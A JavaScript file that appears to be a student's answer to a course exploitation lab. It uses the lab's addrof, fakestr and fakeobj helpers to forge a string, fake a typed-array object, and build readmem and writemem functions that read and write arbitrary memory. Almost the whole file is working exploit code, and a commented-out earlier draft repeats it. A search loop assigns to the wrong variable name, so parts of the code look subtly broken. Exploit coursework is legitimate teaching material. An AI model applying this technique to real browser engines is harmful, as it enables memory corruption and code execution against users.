/*
 * TODO: Part B solution goes here!
 */
let dataplane = new Uint32Array(1);
let strfront = String.fromCharCode(1, 0, 0, 0, 0, 225, 245, 5, 0, 0, 0, 0, 0, 0, 0, 0);
let fakestring = cs361s.fakestr(cs361s.addrof(strfront) + 16);

let originarray = new Uint32Array(72);
while (cs361s.addrof(originarray) < cs361s.addrof(fakestring) || cs361s.addrof(originarray) > cs361s.addrof(fakestring) - 72 + 16 + 10000000) {
    array = new Uint32Array(72);
}

let offset = cs361s.addrof(originarray) - (cs361s.addrof(fakestring) + 16);
let codes = new Uint8Array(72);

var index = 0;
while(index < codes.length){
    codes[index] = fakestring.charCodeAt(offset + index);
    index++;
}


var fb = 0;
while(fb < 8) {
    var bit = 0;
    let temp = cs361s.addrof(dataplane);
    while(bit < fb) {
        temp = (temp - codes[72 - 16 + bit])/256;
        bit++;
    }   
    codes[72 - 16 + fb] = temp % 256;
    fb++;
}

codes[0] = codes[0] + 1;
let cc = String.fromCharCode(...codes)
let controlPlane = cs361s.fakeobj(cs361s.addrof(cc) + 16);


let editmem = function(addr) {
    let num = Math.pow(2, 32);
    controlPlane[14] = addr % num;
    controlPlane[15] = ((addr - controlPlane[0]) / num);
};

let readmem = function(addr) {
    editmem(addr);
    return dataplane[0];
};

let writemem = function(addr, val) {
    editmem(addr);
    dataplane[0] = val;
};



/*
// create the control plane
codes[0] = codes[0] + 1;
let controlPlane = cs361s.fakeobj(cs361s.addrof(String.fromCharCode(...codes)) + 16);

let readmem = function(addr) {
    controlPlane[14] = addr % (Math.pow(2, 32));
    controlPlane[15] = (addr - controlPlane[0]) / (Math.pow(2, 32));
    return dataplane[0];
};

let writemem = function(addr, val) {
    controlPlane[14] = addr % (Math.pow(2, 32));
    controlPlane[15] = (addr - controlPlane[0]) / (Math.pow(2, 32));
    dataplane[0] = val;
};
*/
